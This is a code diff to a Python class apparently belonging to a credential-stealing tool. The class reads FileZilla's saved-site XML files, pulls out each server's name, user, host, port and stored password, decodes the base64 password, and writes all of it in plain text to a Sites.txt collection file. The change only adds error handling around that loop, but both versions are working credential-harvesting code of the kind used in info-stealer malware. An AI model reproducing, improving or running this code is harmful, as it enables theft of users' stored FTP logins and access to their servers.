@@ -41,23 +41,27 @@ class FileZilla:
         temp = []
 
         for file in data_files:
+            try:
 
-            root = ElementTree.parse(path.join(self.__config.SitesPath, file)).getroot()
-            data = self.__config.FileZillaData
+                root = ElementTree.parse(path.join(self.__config.SitesPath, file)).getroot()
+                data = self.__config.FileZillaData
 
-            if not root:
-                continue
+                if not root:
+                    continue
 
-            for server in root[0].findall("Server"):
+                for server in root[0].findall("Server"):
 
-                site_name = server.find("Name").text if hasattr(server.find("Name"), "text") else ""
-                site_user = server.find("User").text if hasattr(server.find("User"), "text") else ""
-                site_pass = server.find("Pass").text if hasattr(server.find("Pass"), "text") else ""
-                site_host = server.find("Host").text if hasattr(server.find("Host"), "text") else ""
-                site_port = server.find("Port").text if hasattr(server.find("Port"), "text") else ""
-                site_pass = b64decode(site_pass).decode("utf-8")
+                    site_name = server.find("Name").text if hasattr(server.find("Name"), "text") else ""
+                    site_user = server.find("User").text if hasattr(server.find("User"), "text") else ""
+                    site_pass = server.find("Pass").text if hasattr(server.find("Pass"), "text") else ""
+                    site_host = server.find("Host").text if hasattr(server.find("Host"), "text") else ""
+                    site_port = server.find("Port").text if hasattr(server.find("Port"), "text") else ""
+                    site_pass = b64decode(site_pass).decode("utf-8")
 
-                temp.append(data.format(site_name, site_user, site_pass, site_host, site_port))
+                    temp.append(data.format(site_name, site_user, site_pass, site_host, site_port))
+
+            except Exception as e:
+                print(f"[FileZilla]: {file} - {repr(e)}")
 
         with open(path.join(self.__full_path, "Sites.txt"), "a", encoding="utf-8") as file_zilla:
             file_zilla.write("".join(item for item in temp))
